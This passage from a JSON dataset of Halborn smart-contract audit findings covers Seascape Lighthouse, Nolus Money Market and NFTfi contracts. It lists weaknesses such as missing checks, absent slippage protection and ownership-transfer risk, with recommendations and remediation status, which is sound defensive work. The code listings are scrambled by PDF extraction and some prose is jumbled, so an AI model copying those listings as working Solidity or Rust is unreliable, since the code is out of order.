scaledCompensationAmount ; emit TransferPrefund ( id , scaledTransferAmount , scaledCompensationAmount ); } auctions [ id ]. transferredPrefund = true ; 242 243 244 245 246 247 248 249 250 251 252 253 254 255 256 257 258 } Risk Level: Likelihood - 3 Impact - 5 Recommendations: The function should verify that the project exists and that its funding phase has already ended. 16 Remediation Plan: SOLVED: The issue was solved in commits 73ce68b0b8405d0cf1a602d247e57fbc3a2d0b4a and f2f7391d77640b1012d34eddb323dd74277c4662. 17 ",
        "labels": [
            "Halborn",
            "Seascape_Lighthouse",
            "Severity: High"
        ]
    },
    {
        "title": "INVALID FEE CHECK",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Seascape_Lighthouse_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The setFees function on the LighthouseTier contract does check for the fees being gibber than zero. However, the fees should be checked against the MIN_SPEND = 10 ** 6. Otherwise, the spendFrom on the claim function will always fail if the fee is less than the forementioned value. Code Location: Listing 3: contracts/LighthouseTier (Lines 67,68,69,70) require ( _fees [0] > 0 , \" LighthouseTier : ZERO_FEE_0 \" ); require ( _fees [1] > 0 , \" LighthouseTier : ZERO_FEE_1 \" ); require ( _fees [2] > 0 , \" LighthouseTier : ZERO_FEE_2 \" ); require ( _fees [3] > 0 , \" LighthouseTier : ZERO_FEE_3 \" ); 66 function setFees ( uint256 [4] memory _fees ) public onlyOwner { 67 68 69 70 71 72 73 74 75 76 77 78 } fees [0] = _fees [0]; fees [1] = _fees [1]; fees [2] = _fees [2]; fees [3] = _fees [3]; emit Fees ( _fees [0] , _fees [1] , _fees [2] , _fees [3]) ; Listing 4: contracts/LighthouseTier (Lines 139) 138 // Charging fee 139 require ( crowns . spendFrom ( msg . sender , fees [ level ]) , \" LighthouseTier : CWS_UNSPEND \"); Listing 5: contracts/crowns-token/CrownsToken.sol (Lines 513) 512 function spendFrom ( address sender , uint256 amount ) public returns ( bool ) { 18 513 require ( amount > MIN_SPEND , \" Crowns : trying to spend less than expected \"); Risk Level: Likelihood - 1 Impact - 3 Recommendations: It is recommended to compare the variables with their minimum and / or maximum value when setting them if they differ from zero. Otherwise, unexpected behaviors could arise. Remediation Plan: SOLVED: Fixed in commit 96fa5c7cbd6970310a594a1af917f4c8b654e82f 19 ",
        "labels": [
            "Halborn",
            "Seascape_Lighthouse",
            "Severity: Low"
        ]
    },
    {
        "title": "MISSING PARAMETER CHECK",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Seascape_Lighthouse_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The setFundCollector function on the LighthousePrefund contract does check for fundCollector being different than owner but the constructor of the same contract does not perform the same check Code Location: Listing 6: contracts/LighthousePrefund (Lines 38,44) 29 constructor ( address _tier , address _submission , address _project , address payable _fundCollector , uint256 _chainID ) { require ( _tier != address (0) && _submission != address (0) && 30 _project != address (0) && _fundCollector != address (0) , \" Lighthouse : ZERO_ADDRESS \" ); require ( _tier != _submission , \" Lighthouse : SAME_ADDRESS \" ); require ( _tier != _project , \" Lighthouse : SAME_ADDRESS \" ); require ( _chainID > 0, \" Lighthouse : ZERO_VALUE \"); 31 32 33 34 35 36 37 38 39 40 } 41 42 function setFundCollector ( address payable _fundCollector ) external lighthouseTier = LighthouseTier ( _tier ); lighthouseRegistration = LighthouseRegistration ( _submission ); lighthouseProject = LighthouseProject ( _project ); fundCollector = _fundCollector ; chainID = _chainID ; onlyOwner { require ( _fundCollector != address (0) , \" Lighthouse : ZERO_ADDRESS \"); require ( _fundCollector != owner () , \" Lighthouse : USED_OWNER \" ); fundCollector = _fundCollector ; 43 44 45 46 47 } 20 Risk Level: Likelihood - 1 Impact - 3 Recommendations: The code should be consistent and the same checks should be applied on the setters and declaration declaration. The owner check should also be applied on the constructor. Remediation Plan: SOLVED: Fixed in commit 7fcd3b7cfaae3e134c3dd1ca08700c1788002c62 21 ",
        "labels": [
            "Halborn",
            "Seascape_Lighthouse",
            "Severity: Low"
        ]
    },
    {
        "title": "TAUTOLOGY EXPRESSION",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Seascape_Lighthouse_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "On LighthouseTier, on the claim and use function the level will always be >= than 0 since the datatype uint8 is used. This means that the level >= 0 check is redundant and only the level < 4 is required. Code Location: Listing 7: contracts/LighthouseTier (Lines 117) 116 function claim ( uint8 level , uint8 v , bytes32 r , bytes32 s ) external { require ( level >= 0 && level < 4, 117 INVALID_PARAMETER \"); \" LighthouseTier : Listing 8: contracts/LighthouseTier (Lines 153) 152 function use ( address investor , uint8 level ) external { 153 require ( level >= 0 && level < 4, \" LighthouseTier : INVALID_PARAMETER \"); Risk Level: Likelihood - 1 Impact - 1 Recommendations: Removing tautology expressions would reduce computation gas costs. 22 Remediation Plan: SOLVED: Fixed in commit 0c4e98aff297ce2beeba3a94eb9ab86299e6efeb 23 ",
        "labels": [
            "Halborn",
            "Seascape_Lighthouse",
            "Severity: Informational"
        ]
    },
    {
        "title": "UNUSED VARIABLES",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Seascape_Lighthouse_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The scaledRatio variable of the Prefund struct on the LighthouseProject contract is only set but not used on any aspect of the code. If this variable was used on a frontend, the same value could be obtained by using scaledAllocation and scaledCompensation (prefund.scaledAllocation / prefund.scaledCompensation). Removing the variable would reduce gas costs and storage costs on the smart contract. Code Location: Listing 9: contracts/LighthouseProject (Lines 39) 29 struct Prefund { 30 31 32 uint256 startTime ; uint256 endTime ; uint256 [3] investAmounts ; // Amount of tokens that user can invest , depending on his tier uint256 [3] collectedAmounts ; // Amount of tokens that users invested so far . uint256 [3] pools ; // Amount of tokens that could be invested in the pool . address token ; investor // Token to accept from uint256 scaledAllocation ; uint256 scaledCompensation ; uint256 scaledRatio ; // prefund PCC allocation // prefund Crowns compensation // Pool to compensation ratio 33 34 35 36 37 38 39 40 } Listing 10: contracts/LighthouseProject (Lines 190) 188 189 190 auction . scaledAllocation auction . scaledCompensation prefund . scaledRatio = auctionAllocation * SCALER ; = auctionCompensation * SCALER ; = prefund . scaledAllocation / prefund . scaledCompensation ; 24 Risk Level: Likelihood - 1 Impact - 1 Recommendations: Unused variables should be removed, this would reduce gas storage and computation gas costs. Remediation Plan: SOLVED: Fixed in commit bcca74d12ef00c6236c78eda5f62f2d66095096d 25 ",
        "labels": [
            "Halborn",
            "Seascape_Lighthouse",
            "Severity: Informational"
        ]
    },
    {
        "title": "INCONSISTENT CONSTRUCTORS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Seascape_Lighthouse_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The LighthouseMint and LighthouseBurn constructors do have different constructor parameters order. If the contract deployment is automated and the scripts are reused this could lead to bad behaviours. Code Location: Listing 11: contracts/LighthouseMint (Lines 36) 36 constructor ( address _lighthouseAuction , address _lighthousePrefund , address _lighthouseTier , address _project , address _crowns ) { Listing 12: contracts/LighthouseBurn (Lines 36) 36 constructor ( address _lighthouseAuction , address _lighthousePrefund , address _lighthouseTier , address _crowns , address _project ) { Risk Level: Likelihood - 1 Impact - 1 Recommendations: It is a good practice to keep the same order of parameters to prevent The _crowns and copy-pasting/automation issues during deployment. _project parameters should match those of the other constructor. Remediation Plan: SOLVED: Fixed in commit 025f8bf9c552062896da7749d0ebd1372941ef6b 26 ",
        "labels": [
            "Halborn",
            "Seascape_Lighthouse",
            "Severity: Informational"
        ]
    },
    {
        "title": "FUNCTION AND REQUIRE TYPOS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Seascape_Lighthouse_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The deleteEditorEditor on the LighthouseProject contract should be named deleteEditor to keep consistency with the other declared methods. The prefund method on the LighthousePrefund contract, does contain the Lighthouse: REGISTRATION_NOT_INITIALIZED require should statement this with message Lighthouse: message, changed the to be PREFUND_NOT_INITIALIZED to reflect the actual reason of revert. Code Location: Listing 13: contracts/LighthouseProject (Lines 105) 104 // / @notice Remove the tier user . 105 function deleteEditorEditor ( address _user ) external onlyOwner { 106 require ( _user != address (0) , \" Lighthouse : ZERO_ADDRESS \"); require ( editors [ _user ], NO_USER \" ); editors [ _user ] = false ; emit ProjectEditor ( _user , false ); 107 108 109 110 111 112 } \" Lighthouse : Listing 14: contracts/LighthousePrefund (Lines 55) 53 // / @dev v , r , s are used to ensure on server side that user passed KYC 54 function prefund ( uint256 projectId , int8 certainTier , uint8 v , bytes32 r , bytes32 s ) external payable { require ( lighthouseProject . prefundInitialized ( projectId ) , \" Lighthouse : REGISTRATION_NOT_INITIALIZED \"); require (! prefunded ( projectId , msg . sender ) , \" Lighthouse : 55 56 ALREADY_PREFUNDED \"); 27 57 require ( certainTier > 0 && certainTier < 4, \" Lighthouse : INVALID_CERTAIN_TIER \"); Risk Level: Likelihood - 1 Impact - 1 Recommendations: It is recommended to fix typos in smart contracts so that the code is clearer and more understandable. Remediation Plan: SOLVED: Fixed in commit 7fcd3b7cfaae3e134c3dd1ca08700c1788002c62 28 ",
        "labels": [
            "Halborn",
            "Seascape_Lighthouse",
            "Severity: Informational"
        ]
    },
    {
        "title": "NO SLIPPAGE PROTECTION",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Nolus_Money_Market_CosmWasm_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf",
        "body": "The exact_amount_in function in the packages/swap/src/trx.rs file does not consider slippage. This means that the user may not receive the exact amount of tokens that they expect. In large swap transactions, there is a risk known as sandwich attacks. These occur when MEV algorithms on Osmosis purchase significant amounts of the asset involved in the swap. This action drives the price of the asset up before the swap occurs. These algorithms then sell the asset at this higher price, making a profit. As a result, the user conducting the swap might end up paying more for the asset than they initially expected. Code Location:  packages/swap/src/trx.rs#L24-L51 Listing 38,41,46) 1: nolus-money-market/packages/swap/src/trx.rs (Lines G: Group , 24 pub fn exact_amount_in <G >( trx : & mut Transaction , 25 sender : HostAccount , 26 token_in : & CoinDTO <G >, 27 28 swap_path : & SwapPath , 29 ) -> Result <() > 30 where 31 32 { 33  the DEX pools 34  the formula at 35 36  minimum amount . // TODO bring the token balances , weights and swapFee -s from // into the oracle in order to calculate the tokenOut as per // https :// docs . osmosis . zone / osmosis - core / modules / gamm /# swap . // Then apply the parameterized maximum slippage to get the 19 // For the first version , we accept whatever price impact and 37  slippage . 38 39 40 41 42 43 44 45 46 47 48 49 50 51 } }; const MIN_OUT_AMOUNT : & str = \" 1 \"; let routes = to_route ( swap_path ) ?; let token_in = Some ( to_cwcoin ( token_in ) ?) ; let token_out_min_amount = MIN_OUT_AMOUNT . into () ; let msg = MsgSwapExactAmountIn { sender : sender . into () , routes , token_in : token_in . map ( Into :: into ) , token_out_min_amount , trx . add_message ( REQUEST_MSG_TYPE , msg ); Ok (() ) BVSS: AO:A/AC:L/AX:M/C:N/I:N/A:N/D:H/Y:N/R:N/S:U (5.0) Recommendation: It is recommended to consider slippage when calculating the minimum amount of tokens that the user should receive. Note that the TODO comment in the code snippet above indicates that this is already planned. Remediation plan: ACKNOWLEDGED: The Nolus team acknowledged this finding. 20 ",
        "labels": [
            "Halborn",
            "Nolus_Money_Market_CosmWasm",
            "Severity: Medium"
        ]
    },
    {
        "title": "THE LEASE CONTRACT COULD BE BLOCKED DURING STATE TRANSITION",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Nolus_Money_Market_CosmWasm_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf",
        "body": "The Leaser creates a new Lease contract each time a user makes a open_lease request. This contract works like a state machine, moving from one state to another depending on the status of the loan granted to the user. There are 10 different states, divided into four main phases (opening, opened, paid, closed). In each phase, the transition from one state to another is done automatically, without any external interaction. Since this money market is going to operate with different currencies, both the communication with a DEX and the use of an Oracle are essential. The DEX used currently is Osmosis, which involves IBC communication for the exchange of currencies. IBC communication implies that transactions are not atomic, so synchronization and resilience of the different com- The Neutron SDK is used as ponents in the communication is critical. middleware to manage IBC packets during communications. It has been observed during the dynamic tests that, in case of error in the Lease contract, for example, if the oracle price feed does not work correctly, the error at the moment of trying to buy the asset is not propagated and handled by the contract, it is only notified to the ContractManager module, so the Lease contract has no information to revert the operations due to the error, nor the possibility to advance to the next state, leaving the contract in a state of permanent blocking. BVSS: AO:S/AC:L/AX:L/C:N/I:N/A:C/D:H/Y:H/R:N/S:U (2.8) 21 Recommendation: It is recommended to ensure that all possible failures in non-atomic transactions, especially those related to interchain communication prob- lems, are handled by the contract, reverting to a previous state if necessary. Remediation Plan: SOLVED: The Nolus team has addressed the issues inherited from the use of NeutronSDK. These problems could be grouped into four categories:  The handling of 'sudo' messages is not atomic: The handling of sudo messages is not atomic: A failure in the processing of a sudo submessage does not revert the state changes made by the processing of the main sudo message. The Neutron team has solved this with a new version.  IBC messages sent as part of the handling of a 'sudo' message are not forwarded: On successful processing of a sudo message, the Neutron SDK ignores the emitted events. The Neutron team has fixed this with a new version.  'Out-of-gas' is treated as an error returned by the smart contract These errors are received and logged in its contractmanager : module. Instead, out-of-gas errors should be returned to the relayers reversing the transactions and allowing the next IBC packet delivery attempts. The Neutron team plans to fix this in their next release, so as a workaround until the solution is ready, the Nolus team has developed and deployed a lease healing feature that recovers leases left in an invalid state. Commit IDs: 78734bf, 9b18a47  Guaranteed delivery of Dex ACKs: According to a NeutronSDK design decision, errors returned by smart contracts when delivering ack- s/timeouts/errors are received and logged in their contractmanager module. For now, there is no means for contracts to request a sub- sequent delivery. 22 Leveraging Nolus Money Markets time alarms, Nolus team has devel- oped a solution to guarantee the delivery of Dex ACKs. It is based on the Cosmwasm actor model and the ability to gain control of er- rors occurring in a sub-message. If the first delivery fails, the ResponseDelivery leverages the guaranteed delivery of time alarms by scheduling a time alarm to make a delivery attempt on the next alarm sending cycle. Commit IDs: 16b1886, 4e84944 23 ",
        "labels": [
            "Halborn",
            "Nolus_Money_Market_CosmWasm",
            "Severity: Low"
        ]
    },
    {
        "title": "TVL RATES CANNOT BE UPDATED",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Nolus_Money_Market_CosmWasm_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf",
        "body": "The configuration of TVL-to-APR rates in the Rewards Dispatcher contract is performed on contract instantiation. Although the contract allows updating some configuration parameters by a governance proposal, the only value that can be updated is the cadence_hours. The RewardScale parameter tvl_to_apr cannot be updated after instantiation. Code Location:  contracts/dispatcher/src/contract.rs#L100-L106 Listing (Line 103) 2: nolus-money-market/contracts/dispatcher/src/contract.rs 100 pub fn sudo ( deps : DepsMut < '_ >, _env : Env , msg : SudoMsg ) ->  ContractResult < CwResponse > { 101 102 103 match msg { SudoMsg :: Config { cadence_hours } => { Config :: update ( deps . storage , cadence_hours ). map (|() |  response :: empty_response () ) } } 104 105 106 } 107 BVSS: AO:S/AC:L/AX:L/C:N/I:N/A:N/D:N/Y:M/R:N/S:U (1.0) 24 Recommendation: It is recommended to consider the possibility of modifying the TVL-to- APR parameter in case it needs some modification in the future due to strategic decisions. Remediation Plan: SOLVED: The Nolus team has solved this issue in the commit ID 65aff6ab19256578271cbaba70c4519313d24497. 25 ",
        "labels": [
            "Halborn",
            "Nolus_Money_Market_CosmWasm",
            "Severity: Informational"
        ]
    },
    {
        "title": "ICA TRANSACTIONS DO NOT TIP THE RECEIVER RELAYER",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Nolus_Money_Market_CosmWasm_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf",
        "body": "Interchain Standard 29 (ICS 29), also known as relayer fees, is a feature aimed at incentivizing Inter-Blockchain Communication (IBC) in- frastructure within the Cosmos ecosystem. ICS 29 is designed to make the job of relayers more sustainable by providing an incentivization layer that rewards relayer operators for successfully relaying packets. The standard defines three types of relayers: Forward relayer, who submits the recv_packet message for a given packet; Reverse relayer, who sub- mits the ack_packet message for a given packet; and Timeout relayer, who submits the timeout_packet message for a given packet It was identified that the ICA (Interchain Accounts) transactions do not tip the receiver relayer. Not tipping for the reception of packets (recv _fee) in the IBC protocol may lead to a reduced incentive for relayers to perform this operation, potentially impacting the reliability and efficiency of packet transmission across the blockchain networks. Code Location:  packages/platform/src/ica.rs#L61-L89 Listing 3 connection : Conn , trx : Transaction , memo : M , timeout : Duration , ack_tip : Coin <C >, timeout_tip : Coin <C >, 1 pub fn submit_transaction < Conn , M , C >( 2 3 4 5 6 7 8 ) -> Batch 9 where 26 batch . schedule_execute_no_reply ( NeutronMsg :: submit_tx ( Conn : Into < String >, M: Into < String >, C: Currency , let mut batch = Batch :: default () ; connection . into () , ICA_ACCOUNT_ID . into () , trx . into_msgs () , memo . into () , timeout . secs () , IbcFee { 10 11 12 13 { 14 15 16 17 18 19 20 21 22 23 24 25  timeout_tip )], 26 27 28 )); batch }, recv_fee : vec! [] , ack_fee : vec! [ coin_legacy :: to_cosmwasm_impl ( ack_tip )], timeout_fee : vec! [ coin_legacy :: to_cosmwasm_impl ( BVSS: AO:A/AC:L/AX:L/C:N/I:N/A:N/D:N/Y:N/R:N/S:U (0.0) Recommendation: It is recommended to allow tipping for the reception of packets (recv_fee ) in the IBC protocol by adding a recv_tip parameter to the submit_- transaction function and passing it to the IbcFee struct. Remediation Plan: ACKNOWLEDGED: The Nolus team acknowledged this finding, stating that: Neutron does not support recv_fee. We follow the Neutrons solution for tips/fees for the relayers until they eventually migrate to the ICS standard one. 27 ",
        "labels": [
            "Halborn",
            "Nolus_Money_Market_CosmWasm",
            "Severity: Informational"
        ]
    },
    {
        "title": "REDUNDANT FIELD IN THE LOAN STRUCT",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Nolus_Money_Market_CosmWasm_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf",
        "body": "and its loan current_period an The annual_margin_interest. This is a duplicated value that can be removed, as duplicating data can lead to inconsistencies when updating one of the values but not the other. field track both keep of Code Location:  contracts/lease/src/loan/mod.rs#L78-L96 Listing 4 start : Timestamp , lpp_loan : LppLoan , annual_margin_interest : Percent , interest_payment_spec : InterestPaymentSpec , let current_period = Self :: due_period ( annual_margin_interest , start , interest_payment_spec . due_period () , 1 pub ( super ) fn new ( 2 3 4 5 6 ) -> Self { 7 8 9 10 11 12 13 14 15 16 17 18 19 } ); Self { } annual_margin_interest , lpn : PhantomData , lpp_loan , interest_payment_spec , current_period , 28 BVSS: AO:A/AC:L/AX:L/C:N/I:N/A:N/D:N/Y:N/R:N/S:U (0.0) Recommendation: It is recommended to remove the annual_margin_interest field from the loan struct and use the annual_margin_interest field from the current_period struct instead. Remediation Plan: SOLVED: The Nolus team has solved this issue in the commit ID 94fd- cdb01eceb25e9604b933fe48d835d90ca1c6. 29 ",
        "labels": [
            "Halborn",
            "Nolus_Money_Market_CosmWasm",
            "Severity: Informational"
        ]
    },
    {
        "title": "DUPLICATE STORAGE READ",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Nolus_Money_Market_CosmWasm_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf",
        "body": "The is_registered function in the Feeders struct reads from the storage twice. The first read is to check if the feeders field is None, and the second read is to get the feeders field. This can be refactored to read from the storage only once, since the may_load function returns an Option that can carry the feeders field if it exists. This applies to the remove function as well, where the update function reads from storage again. Code Location:  packages/marketprice/src/feeders.rs#L43-L51 Listing 5 } return Ok ( false ); if self .0. may_load ( storage ) ?. is_none () { 1 pub fn is_registered (& self , storage : & dyn Storage , address : & Addr )  -> StdResult < bool > { 2 3 4 5 6 7 8 9 } let addrs = self .0. load ( storage ) ?; Ok ( addrs . contains ( address ))  packages/marketprice/src/feeders.rs#L67-L78 Listing 6 1 pub fn remove (& self , deps : DepsMut < '_ >, addr : Addr ) -> Result <() ,  PriceFeedersError > { 2  HashSet < Addr >> { let remove_address = | mut addrs : HashSet < Addr >| -> StdResult < 30 addrs . remove (& addr ); Ok ( addrs ) }; if self .0. may_load ( deps . storage ) ?. is_some () { self .0. update ( deps . storage , remove_address ) ?; } Ok (() ) 3 4 5 6 7 8 9 10 11 12 } BVSS: AO:A/AC:L/AX:L/C:N/I:N/A:N/D:N/Y:N/R:N/S:U (0.0) Recommendation: It is recommended to refactor the is_registered function to read from storage only once. Remediation Plan: SOLVED: The Nolus team has solved this issue in the commit ID efcb75d93385e46b44fe420ee264315e8bbb347c for the is_registered function and the commit ID 55cfe785d29eb8b29d5082c24254f10ddbb68b8a for the remove function. 31 ",
        "labels": [
            "Halborn",
            "Nolus_Money_Market_CosmWasm",
            "Severity: Informational"
        ]
    },
    {
        "title": "OUTDATED OBSERVATIONS CAN BE STORED",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Nolus_Money_Market_CosmWasm_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf",
        "body": "The add_observation function in the Feed struct adds an observation to the observations field. However, there is no check to ensure that the at field of the observation is greater than or equal to the valid_since This can lead to outdated observations being stored in the field. observations field. Note that the outdated observations are filtered out when the calc_price function is called. Code Location:  packages/marketprice/src/feed/mod.rs#L33-L45 Listing 7 mut self , from : Addr , at : Timestamp , price : Price <C , QuoteC >, valid_since : Timestamp , 1 pub fn add_observation ( 2 3 4 5 6 7 ) -> Self { 8 9 10 11 12 13 } self . observations . retain ( observation :: valid_since ( valid_since )) ; self . observations . push ( Observation :: new ( from , at , price )) ; self BVSS: AO:A/AC:L/AX:L/C:N/I:N/A:N/D:N/Y:N/R:N/S:U (0.0) 32 Recommendation: It is recommended to add a check to ensure that the at field of the observation is greater than or equal to the valid_since field. Remediation Plan: SOLVED: The Nolus team has solved this issue in the commit ID 456837837af0232651dfe6e0955ddbd3d7ee1102. 33 ",
        "labels": [
            "Halborn",
            "Nolus_Money_Market_CosmWasm",
            "Severity: Informational"
        ]
    },
    {
        "title": "RELAYER TIPS ARE HARDCODED",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Nolus_Money_Market_CosmWasm_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf",
        "body": "Interchain Standard 29 (ICS 29), also known as relayer fees, is a feature aimed at incentivizing Inter-Blockchain Communication (IBC) in- frastructure within the Cosmos ecosystem. ICS 29 is designed to make the job of relayers more sustainable by providing an incentivization layer that rewards relayer operators for successfully relaying packets. The standard defines three types of relayers: Forward relayer, who submits the recv_packet message for a given packet; Reverse relayer, who sub- mits the ack_packet message for a given packet; and Timeout relayer, who submits the timeout_packet message for a given packet It was found that the relayer tips are hardcoded in the packages/dex/src /trx.rs file. This means that the relayer tips cannot be changed without a code change. Currently, the relayer tips are set to 1unls which is not ideal since the relayer tips should be set to a value that is appropriate for the network. Code Location:  packages/dex/src/trx.rs#L21-L27 Listing 8 1 // TODO take them as input from the client 2 const ICA_TRANSFER_ACK_TIP : Coin < Nls > = Coin :: new (1) ; 3 const ICA_TRANSFER_TIMEOUT_TIP : Coin < Nls > = ICA_TRANSFER_ACK_TIP ; 4 5 // TODO take them as input from the client 6 const ICA_SWAP_ACK_TIP : Coin < Nls > = Coin :: new (1) ; 7 const ICA_SWAP_TIMEOUT_TIP : Coin < Nls > = ICA_SWAP_ACK_TIP ; 34 BVSS: AO:A/AC:L/AX:L/C:N/I:N/A:N/D:N/Y:N/R:N/S:U (0.0) Recommendation: It is recommended to take the relayer tips as input from the client. Note that the TODO comments in the code snippet above indicate that this is already planned. Remediation Plan: ACKNOWLEDGED: The Nolus team acknowledged this finding. 35 MANUAL TESTING 36 In the manual testing phase, the following scenarios were simulated. The scenarios listed below were selected based on the severity of the vulnerabilities Halborn was testing the program for. 5.1 VERIFYING ACCESS CONTROL ON ENTRYPOINTS Access control often represents a vulnerable point in smart contract assessments. To ensure that privileged operations are only accessible by designated users, the following tests were performed: 1. Contract access control: Verify that the privileged entrypoints re- quiring access control could only be invoked by the specified con- tract. For instance, the OpenLoan entrypoint in the LPP contract was accessible only by the Leaser. Figure 1: Try OpenLoan on LPP G N I T S E T L A U N A M Figure 2: Try SendRewards on Treasury 2. User access control: Verify that the entrypoints requiring access control could only be invoked by the specified user. For example, only the user who initially opened a loan could close it or only users who have made a deposit can claim rewards. 37 Figure 3: Claim rewards from other user 3. Configuration updates: Validate that all entrypoints that update or modify configuration parameters could only be invoked by the contract owner or a privileged user. Figure 4: Try to update Lease code 5.2 VERIFYING ERROR HANDLING DURING CONTRACT INSTANTIATION To mitigate potential unintentional errors leading to misconfigurations during contract instantiation, the following tests were performed: 1. Address validation: Verify that addresses are validated before being stored in the configuration. 2. Rates validation: Ensure that the input parameters defined as rates were within the limits of 0%-100%. In the case of the Leaser, it has been also checked the order of the different rates in the liability (e.g: first warning < max). Figure 5: Borrow rate greater than 100% 38 G N I T S E T L A U N A M Figure 6: Liability check 3. No empty objects: Ensure that those objects that are not Optional have valid values (e.g: tvl_to_apr could not contain repeated or empty values). Figure 7: No duplicated values Figure 8: No empty values 5.3 VERIFYING INPUT VALIDATION ON THE ENTRY POINTS Entrypoints lacking access control for privileged accounts/contracts can be executed by any user, allowing any input value. To test the contracts behavior under these circumstances, the following tests were conducted: 1. User Input Validation: the entrypoints were checked before being stored or used in operations. For instance, trying to open a loan with a currency not registered in the PaymentGroup. Verify inputs that user all in 39 G N I T S E T L A U N A M Figure 9: Try OpenLease with wrong currency 2. Configuration updates: configuration entrypoints perform the corresponding input validation, as well as during the instantiation. Verify update that the Figure 10: Update input validation 5.4 VERIFYING REPEATED OPERATIONS Executing entrypoints in an unexpected order or more than once can lead To address this, the following tests were to unpredictable behavior. performed: 1. Multiple Rewards distribution before claim (out of the Alarm system): Verify that the number of rewards assigned to each lender remained accurate even when distributed at different moments. 2. Dex setup repetition: Confirm that the DEX, once set up, could not be modified. Figure 11: Dex setup repetition 40 G N I T S E T L A U N A M 3. Loan repayment and closure: Confirm that a loan could not be closed before being repaid and that it could not be repaid or closed twice Figure 12: Try to close an unpaid loan G N I T S E T L A U N A M 41 ",
        "labels": [
            "Halborn",
            "Nolus_Money_Market_CosmWasm",
            "Severity: Informational"
        ]
    },
    {
        "title": "POSSIBLE LOSS OF OWNERSHIP",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/NFTfi_DirectLoanFixedOffer_Redeployment_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "When transferring ownership of the protocol, no checks are performed on whether the new address is valid and active. In case there is a mistake when transferring the ownership, the whole protocol is locked out of its permissioned functionalities. Code Location: Listing 1: Ownable.sol function transferOwnership ( address _newOwner ) public virtual require ( _newOwner != address (0) , \" Ownable : new owner is 48  onlyOwner { 49  the zero address \" ); 50 51 } _setOwner ( _newOwner ); Risk Level: Likelihood - 1 Impact - 5 Recommendation: The transfer of ownership process should be split into two different transactions, the first one calling the requestTransferOwnership function which proposes a new owner for the protocol, and the second one, the new owner accepts the proposal by calling acceptsTransferOwnership function. 13 Remediation Plan: RISK ACCEPTED: The NFTfi team accepted the risk of this finding. The team most likely will implement the remediation when they upgrade the platform. 14 ",
        "labels": [
            "Halborn",
            "NFTfi_DirectLoanFixedOffer_Redeployment",
            "Severity: Medium"
        ]
    },
    {
        "title": "ZERO ADDRESS NOT CHECKED",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/NFTfi_DirectLoanFixedOffer_Redeployment_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "In the constructor of the DirectLoanFixedOfferRedeploy.sol contract, admin and nfthub contract address variables are not being checked to avoid pointing to the zero address, extending this issue to the parent contracts. Code Location: Listing 2: DirectLoanFixedOfferRedeploy.sol 72 73 74 75 76 77 78 constructor ( address _admin , address _nftfiHub , address [] memory _permittedErc20s ) DirectLoanFixedOffer ( _admin , _nftfiHub , _permittedErc20s ) { // solhint - disable - previous - line no - empty - blocks } Risk Level: Likelihood - 2 Impact - 1 Recommendation: When setting an address variable, always make sure the value is not zero. Remediation Plan: ACKNOWLEDGED: The NFTfi team acknowledged this issue. 15 ",
        "labels": [
            "Halborn",
            "NFTfi_DirectLoanFixedOffer_Redeployment",
            "Severity: Informational"
        ]
    },
    {
        "title": "USE I++ INSTEAD OF ++I IN LOOPS FOR GAS OPTIMIZATION",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/NFTfi_DirectLoanFixedOffer_Redeployment_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
